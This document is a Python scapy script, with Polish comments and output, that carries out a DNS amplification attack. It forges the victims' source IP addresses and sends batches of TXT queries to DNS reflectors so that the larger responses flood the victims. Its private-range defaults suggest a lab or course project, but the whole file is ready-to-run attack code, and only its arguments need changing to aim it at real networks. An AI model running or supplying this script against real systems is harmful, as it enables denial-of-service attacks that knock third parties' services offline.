#!/usr/bin/env python3

from scapy.all import IP, UDP, DNS, DNSQR, send
import argparse
import sys
import time
import random

def main():
    parser = argparse.ArgumentParser(description="Generator zapytań DNS Amplification")
    parser.add_argument("--victims", default="10.0.5.1", help="Lista adresów IP ofiar rozdzielona przecinkami (np. 10.0.5.1,10.0.5.2)")
    parser.add_argument("--dns-servers", default="10.0.2.1", help="Lista adresów IP serwerów DNS rozdzielona przecinkami (np. 10.0.2.1,10.0.4.1)")
    parser.add_argument("--domain", default="psir.proj", help="Domena zapytania DNS (celowo wyzwalająca dużą odpowiedź)")
    parser.add_argument("--count", type=int, default=50, help="Całkowita liczba pakietów do wysłania")
    parser.add_argument("--min-delay", type=float, default=0.0001, help="Minimalne opóźnienie między pakietami (w sekundach)")
    parser.add_argument("--max-delay", type=float, default=0.0005, help="Maksymalne opóźnienie między pakietami (w sekundach)")
    
    args = parser.parse_args()

    victims = [v.strip() for v in args.victims.split(",")]
    dns_servers = [d.strip() for d in args.dns_servers.split(",")]
    domain = args.domain
    count = args.count
    min_delay = args.min_delay
    max_delay = args.max_delay

    print(f"[*] Przygotowanie ataku DNS Amplification:")
    print(f"    - Pule adresów ofiar (Spoofed IP): {victims}")
    print(f"    - Pule serwerów DNS (Reflektory): {dns_servers}")
    print(f"    - Domena zapytania: {domain} (Rekord TXT)")
    print(f"    - Planowana liczba pakietów: {count}")
    print(f"    - Opóźnienie losowe: od {min_delay}s do {max_delay}s")

    try:
        print(f"[*] Generowanie i wysyłanie {count} pakietów w paczkach...")
        
        batch_size = 500
        sent = 0
        for i in range(0, count, batch_size):
            packets = []
            for _ in range(min(batch_size, count - sent)):
                current_victim = random.choice(victims)
                current_dns = random.choice(dns_servers)
                packets.append(
                    IP(src=current_victim, dst=current_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="TXT"))
                )
            
            send(packets, inter=0, verbose=False)
            sent += len(packets)
            print(f"[+] Wysłano {sent}/{count} pakietów.")
            
    except KeyboardInterrupt:
        print("\n[-] Atak przerwany przez użytkownika.")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Wystąpił błąd podczas wysyłania pakietów: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    main()
